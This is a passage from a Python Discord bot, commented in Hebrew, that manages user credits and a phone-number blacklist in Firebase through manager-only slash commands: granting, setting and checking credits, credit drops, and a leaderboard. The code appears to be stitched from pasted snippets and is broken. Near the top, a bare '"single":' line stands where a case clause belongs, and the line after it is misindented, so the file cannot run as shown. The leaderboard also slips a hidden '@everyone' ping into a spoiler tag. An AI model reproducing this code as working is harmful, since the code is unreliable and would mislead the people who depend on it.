            db.reference(f"users/{u_id}").update({"credits": new_credits})
            updated_count += 1
            
        await send_detailed_log("💰 הוספת קרדיטים גלובלית", interaction.user, [
            {"name": "כמות שהתווספה לכולם:", "value": str(add_int)},
            {"name": "סה\"כ משתמשים שעודכנו:", "value": str(updated_count)}
        ], color=0x2ECC71)
        
        return await interaction.followup.send(f"✅ הפיצוץ הצליח! התווספו **{add_int}** קרדיטים ל-**{updated_count}** משתמשים בבסיס הנתונים.", ephemeral=True)

    # אפשרות 2: הוספה למשתמש ספציפי (התאמה מלאה לקוד המקורי שלך שתומך ב-lifetime)
    "single":
        if not user:
            return await interaction.followup.send("❌ שכחת לתייג משתמש! עבור 'משתמש ספציפי' חובה לבחור את הפרמטר user.", ephemeral=True)
            
       ref = db.reference(f"users/{user.id}")
        
        # ניסיון לקרוא את הערך הנוכחי בזהירות
        try:
            snap = ref.get()
            cur = str(snap.get("credits", "0")) if isinstance(snap, dict) else "0"
        except:
            cur = "0"
        
        # חישוב היתרה החדשה
        if cur == "lifetime" or amount.lower() == "lifetime":
            new_total = "lifetime"
        else:
            try:
                new_total = str(int(cur) + int(amount))
            except ValueError:
                return await interaction.followup.send("❌ נא להזין מספר תקין או 'lifetime'", ephemeral=True)
        
        # שימוש ב-update בלבד - זה לא יזרוק 404 גם אם המשתמש חדש
        ref.update({"credits": new_total, "last_claim": 0})
        
        await interaction.followup.send(f"✅ עודכן בהצלחה! יתרה חדשה: {new_total}", ephemeral=True)
# ... (אחרי כל הפקודות הקיימות שלך)

@bot.tree.command(name="check_credits", description="בדיקת כמות קרדיטים של משתמש")
@app_commands.describe(user="המשתמש שאתה רוצה לבדוק")
async def check_credits(interaction: discord.Interaction, user: discord.Member):
    # בדיקה אם המשתמש מורשה (הפונקציה is_manager צריכה להיות מוגדרת אצלך בקוד)
    if not is_manager(interaction):
        return await interaction.response.send_message("❌ אין לך הרשאה להשתמש בפקודה זו", ephemeral=True)

    try:
        # הנתיב שראינו ב-Firebase שלך
        ref = db.reference(f"users/{user.id}/credits")
        credits = ref.get()

        if credits is None:
            credits = 0
            
        await interaction.response.send_message(f"💰 למשתמש {user.mention} יש **{credits}** קרדיטים.", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"❌ אירעה שגיאה בבדיקת הקרדיטים: {e}", ephemeral=True)

# ... (שאר הקוד של הבוט)


@bot.tree.command(name="set", description="קביעת יתרה")
async def set_credits(interaction: discord.Interaction, u: discord.User, a: str):
    if not is_manager(interaction):
        return await interaction.response.send_message("❌ למנהלים בלבד", ephemeral=True)
    
    await interaction.response.defer(ephemeral=True)
    if a.lower() != "lifetime":
        try: int(a)
        except ValueError: return await interaction.followup.send("❌ נא להזין מספר תקין או 'lifetime'", ephemeral=True)
            
    ref = db.reference(f"users/{u.id}")
    ref.update({"credits": a})
    await interaction.followup.send(f"✅ היתרה של {u.name} נקבעה ל-{a}", ephemeral=True)
    
    await send_detailed_log("⚙️ קביעת יתרה קבועה", interaction.user, [
        {"name": "יעד:", "value": u.mention},
        {"name": "יתרה שנקבעה:", "value": a}
    ], color=0x3498DB)

@bot.tree.command(name="blacklist", description="חסימת מספר")
async def blacklist(interaction: discord.Interaction, p: str):
    if not is_manager(interaction):
        return await interaction.response.send_message("❌ למנהלים בלבד", ephemeral=True)
    
    await interaction.response.defer(ephemeral=True)
    db.reference(f"blacklist/{p}").set(True)
    await interaction.followup.send(f"✅ בוצע על {p}", ephemeral=True)
    
    await send_detailed_log("🚫 חסימת מספר (Blacklist)", interaction.user, [{"name": "מספר שנחסם:", "value": p}], color=0xE74C3C)

@bot.tree.command(name="remove", description="הסרת חסימה")
async def remove_blacklist(interaction: discord.Interaction, p: str):
    if not is_manager(interaction):
        return await interaction.response.send_message("❌ למנהלים בלבד", ephemeral=True)
    
    await interaction.response.defer(ephemeral=True)
    db.reference(f"blacklist/{p}").delete()
    await interaction.followup.send(f"✅ בוצע על {p}", ephemeral=True)
    
    await send_detailed_log("🔓 הסרת חסימה", interaction.user, [{"name": "מספר שהוסר:", "value": p}], color=0xF1C40F)

@bot.tree.command(name="blacklist_list", description="הצגת רשימת החסומים")
async def blacklist_list(interaction: discord.Interaction):
    if not is_manager(interaction):
        return await interaction.response.send_message("❌ למנהלים בלבד", ephemeral=True)
    
    await interaction.response.defer(ephemeral=True)
    snap = db.reference("blacklist").get()
    list_str = "\n".join(snap.keys()) if snap else "ריק"
    await interaction.followup.send(f"**חסומים:**\n{list_str}", ephemeral=True)

@bot.tree.command(name="drop", description="דרופ קרדיטים")
async def drop_credits(interaction: discord.Interaction, a: int, w: int):
    if not is_manager(interaction):
        return await interaction.response.send_message("❌ למנהלים בלבד", ephemeral=True)
    
    d_id = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=7))
    activeDrops[d_id] = {"amount": a, "winners": w, "claimed": []}
    
    embed = discord.Embed(title="🎉 Credit Drop!", description=f"הראשונים שילחצו יקבלו **{a}** קרדיטים!", color=0x5865F2)
    embed.add_field(name="זוכים שנשארו:", value=str(w))
    
    view = discord.ui.View()
    btn_claim = discord.ui.Button(label="Claim 🎁", style=discord.ButtonStyle.success, custom_id=f"claim_{d_id}")
    view.add_item(btn_claim)
    
    await interaction.response.send_message(embed=embed, view=view)
    
    await send_detailed_log("🎁 יצירת דרופ קרדיטים", interaction.user, [
        {"name": "כמות לכל זוכה:", "value": str(a)},
        {"name": "סה\"כ זוכים מוגדרים:", "value": str(w)}
    ], color=0x9B59B6)

@bot.tree.command(name="ping", description="בודק אם הבוט מגיב")
async def ping(interaction: discord.Interaction):
    await interaction.response.send_message("פונג! הבוט עובד חלק! 🏓", ephemeral=True)

@bot.tree.command(name="leaderboard", description="הצגת טבלת מובילים (מנהלים בלבד)")
@app_commands.describe(count="כמה משתמשים להציג בטופ")
@app_commands.checks.has_permissions(administrator=True) # הגבלה למנהלים בלבד
async def leaderboard(interaction: discord.Interaction, count: int = 10):
    # הפעם לא נשתמש ב-defer עם ephemeral=True כדי שההודעה תהיה לכולם
    await interaction.response.defer(ephemeral=False)
    
    users_ref = db.reference("users")
    all_users = users_ref.get()
    
    if not all_users:
        return await interaction.followup.send("❌ אין נתונים בשרת.", ephemeral=True)
    
    leaderboard_data = []
    for u_id, u_data in all_users.items():
        credits_val = u_data.get("credits", "0")
        if credits_val != "lifetime":
            try:
                leaderboard_data.append({"id": u_id, "credits": int(credits_val)})
            except ValueError:
                continue
    
    leaderboard_data.sort(key=lambda x: x["credits"], reverse=True)
    top_users = leaderboard_data[:count]
    
    # יצירת הודעה מעוצבת (Embed)
    embed = discord.Embed(
        title="🏆 טבלת מובילי הקרדיטים 🏆",
        color=discord.Color.gold()
    )
    
    # הוספת השורות לתוך ה-Embed
    rank_text = ""
    for i, user_data in enumerate(top_users, 1):
        user = bot.get_user(int(user_data["id"]))
        user_name = user.name if user else f"משתמש {user_data['id']}"
        rank_text += f"{i}. **{user_name}**: {user_data['credits']} קרדיטים\n"
    
    embed.description = rank_text
    
    # שליחת ההודעה לכולם עם תיוג חבוי למטה
    await interaction.followup.send(content="||@everyone||", embed=embed)

# טיפול במקרה שמישהו לא מנהל מנסה להריץ את הפקודה
@leaderboard.error
async def leaderboard_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.MissingPermissions):
        await interaction.response.send_message("❌ רק מנהלים יכולים להריץ פקודה זו.", ephemeral=True)


# --- הרצת הבוט ---
if __name__ == "__main__":
    token = os.environ.get("TOKEN") or os.environ.get("DISCORD_TOKEN")
    if not token:
        raise RuntimeError("Missing token. Please set TOKEN or DISCORD_TOKEN environment variable.")
    bot.run(token)
